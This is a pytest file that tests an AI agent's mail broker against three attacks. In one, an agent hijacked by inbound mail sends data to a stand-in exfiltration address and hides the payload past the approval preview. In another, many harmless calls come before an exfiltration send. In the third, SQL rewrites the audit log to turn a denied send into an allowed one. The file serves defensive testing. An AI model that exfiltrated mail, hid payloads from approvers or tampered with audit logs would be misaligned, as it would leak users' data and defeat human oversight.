"""Attacks 18-20: misleading approval text, slow drip, log tampering."""

import sqlite3

from broker.approvals.base import BODY_PREVIEW_CHARS, ApprovalOutcome
from broker.audit import verify
from broker.rules.models import Verdict
from tests.conftest import WorldFactory

EXFIL = "collect@evil.test"


def test_18_approval_prompt_shows_real_action_not_message_text(world: WorldFactory) -> None:
    w = world(messages=["m_misleading"], default=ApprovalOutcome.DENIED)
    inbound = w.backend.messages[0].body
    w.call("read_message", message_id="m_misleading")
    # The hijacked agent follows the mail: innocent subject, real exfil recipient, long body
    # with the payload past the preview cut-off.
    body = "Hi Alice, lunch works. " + "x" * 300 + " BOARD DECK ATTACHED"
    result = w.call("send_mail", to=[EXFIL], subject="Reply to Alice about lunch", body=body)
    assert result.verdict == Verdict.ASK
    [prompt] = w.approver.requests
    assert prompt.recipients == [EXFIL]  # the real recipient, whatever the subject says
    assert prompt.subject == "Reply to Alice about lunch"  # the real subject being sent
    assert prompt.body_preview == body[:BODY_PREVIEW_CHARS]
    assert "session tainted" in prompt.reason
    for field in (prompt.subject, prompt.body_preview, prompt.reason, *prompt.recipients):
        assert inbound not in field
    assert w.backend.sent == []


def test_19_slow_drip_then_send_still_needs_approval(world: WorldFactory) -> None:
    # Working profile, never tainted: 40 harmless calls, then a send. Still asks.
    w = world(messages=["m_lunch", "m_chain1"], events=["e_standup", "e_alice"])
    for i in range(40):
        tool = ("search_mail", "read_message", "list_events")[i % 3]
        args = {"message_id": "m_lunch"} if tool == "read_message" else {}
        assert w.call(tool, **args).ok
    assert not w.session.tainted
    assert w.call("send_mail", to=[EXFIL], subject="s", body="b").verdict == Verdict.ASK

    # Autonomous profile, one early unknown read buried under 40 harmless ones.
    a = world(profile="autonomous", messages=["m_forward", "m_lunch"], events=["e_standup"])
    a.call("read_message", message_id="m_forward")
    for i in range(40):
        tool = ("search_mail", "read_message", "list_events")[i % 3]
        args = {"message_id": "m_lunch"} if tool == "read_message" else {}
        a.call(tool, **args)
    assert a.session.tainted
    assert a.call("send_mail", to=[EXFIL], subject="s", body="b").verdict == Verdict.ASK
    assert w.backend.sent == [] and a.backend.sent == []


def test_20_log_tampering_is_detected(world: WorldFactory) -> None:
    w = world(messages=["m_forward"])
    w.call("read_message", message_id="m_forward")
    w.call("forward_message", message_id="m_forward", to=[EXFIL])
    w.call("send_mail", to=[EXFIL], subject="Fwd", body="10 messages")
    w.call("search_mail")
    assert verify(w.log_path) is None

    # An attacker with file access rewrites the denied send as an allowed one.
    conn = sqlite3.connect(w.log_path)
    conn.execute("UPDATE log SET decision = 'allow' WHERE id = 3")
    conn.commit()
    conn.close()
    assert verify(w.log_path) == 3
